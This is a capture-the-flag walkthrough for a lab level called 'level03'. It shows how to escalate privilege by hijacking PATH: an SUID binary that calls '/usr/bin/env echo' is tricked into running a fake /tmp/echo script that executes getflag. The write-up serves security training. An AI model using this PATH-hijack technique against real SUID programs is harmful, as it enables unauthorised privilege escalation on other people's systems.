# Level03
## Step by step
### 1. Locate the executable in `level03` home directory
  ```bash
  > ls -la
  -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
  ```

The `level03` file is an executable with the **SUID** bit set, meaning it will execute with the privileges of its owner (`flag03`).

---

### 2. Execute the binary
Running the binary gives the following output:
  ```bash
  > ./level03
   Exploit me
  ```
---

### 3. Analyze the binary with `strings`
The `strings` command reveals printable character sequences in the binary:
  ```bash
  > strings level03
  /lib/ld-linux.so.2
  KT{K
  __gmon_start__
  libc.so.6
  _IO_stdin_used
  setresgid
  setresuid
  system
  getegid
  geteuid
  __libc_start_main
  GLIBC_2.0
  PTRh
  UWVS
  [^_]
  /usr/bin/env echo Exploit me
  ;*2$"
  GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
  /home/user/level03
  /usr/include/i386-linux-gnu/bits
  /usr/include/i386-linux-gnu/sys
  level03.c
  ...
  ```
From this, we observe the binary uses `/usr/bin/env echo` to print the message "Exploit me."

---

### 4. Exploit the binary by replacing `echo`
To exploit this, we create a custom `echo` script that runs the `getflag` command:
  ```bash
  >  cat <<hey >/tmp/echo
  > #!/bin/bash
  > getflag
  > hey

  > export PATH=/tmp:$PATH

  > ./level03 
  Check flag.Here is your token : XXX
  ```

  
